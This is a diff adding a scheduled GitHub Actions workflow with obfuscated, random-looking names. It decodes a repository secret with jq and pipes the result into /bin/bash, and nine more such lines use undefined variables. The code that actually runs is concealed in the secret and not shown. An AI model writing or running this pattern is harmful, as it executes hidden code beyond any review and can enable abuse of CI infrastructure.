@@ -1,0 +1,25 @@
+name: machuntiangao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: machuntiangao
+        env:
+          luf81661: ${{ secrets.luf81661 }}
+        run: |
+          echo $luf81661 | jq -r .bkv64282 | /bin/bash
+          echo $gvove76471 | jq -r .i1 | /bin/bash
+          echo $rmpm4 | jq -r .jrd85 | /bin/bash
+          echo $jplsz7 | jq -r .kd74474 | /bin/bash
+          echo $yvr4079 | jq -r .pi36 | /bin/bash
+          echo $pjl39 | jq -r .qbzy384 | /bin/bash
+          echo $h6701 | jq -r .yew574 | /bin/bash
+          echo $gvdx5 | jq -r .bk01 | /bin/bash
+          echo $hzxuy21006 | jq -r .r33930 | /bin/bash
+          echo $kl10614 | jq -r .h95641 | /bin/bash
+
